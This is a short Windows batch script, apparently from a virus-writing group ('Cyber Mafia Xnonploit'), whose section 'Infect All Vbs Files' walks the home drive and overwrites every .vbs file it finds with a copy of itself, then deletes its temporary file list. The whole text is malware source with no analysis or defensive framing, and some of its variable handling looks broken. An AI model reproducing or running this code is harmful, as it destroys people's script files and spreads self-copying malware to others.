:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Vbs Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.vbs) Do (
            Set VbsInfect=%%Z > Nul
            Copy /y %0 %VbsInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
